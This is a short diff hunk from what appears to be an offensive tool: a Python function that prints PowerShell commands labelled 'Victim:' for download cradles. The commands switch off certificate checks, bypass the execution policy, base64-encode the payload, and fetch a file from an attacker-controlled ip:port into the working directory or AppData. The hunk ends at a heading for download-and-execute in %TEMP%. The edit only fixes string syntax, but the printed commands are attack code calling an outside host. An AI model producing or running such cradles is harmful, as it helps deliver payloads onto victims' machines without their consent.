@@ -112,7 +112,7 @@ def powershell(ip,port,file,proxy,creds):
     print("\033[38;5;208mVictim:\033[0m powershell -nop -exec bypass -e " + base64.b64encode('[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"+wproxy+"$w.DownloadFile(\'http://"+ip+":"+port+"/"+file+"\',\'"+file+"\')'.encode('UTF-16LE')).decode() + "\n")
     
     print("\033[94mDownload a file in AppData%\033[0m")
-    print("\033[38;5;208mVictim:\033[0m powershell -nop -exec bypass [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; iwr http://"+ip+":"+port+"/"+file+" -Outfile $env:APPDATA\\"+file+";"+wproxy+")
+    print("\033[38;5;208mVictim:\033[0m powershell -nop -exec bypass [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; iwr http://"+ip+":"+port+"/"+file+" -Outfile $env:APPDATA\\"+file+";"+wproxy+"\n")
     print("\033[38;5;208mVictim:\033[0m powershell -nop -exec bypass -e " + base64.b64encode('[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; iwr http://"+ip+":"+port+"/"+file+" -Outfile $env:APPDATA\\"+file+";"+wproxy+"'.encode('UTF-16LE')).decode() + "\n")
     
     print("\033[94mDownload and execute a file in %TEMP%\033[0m")
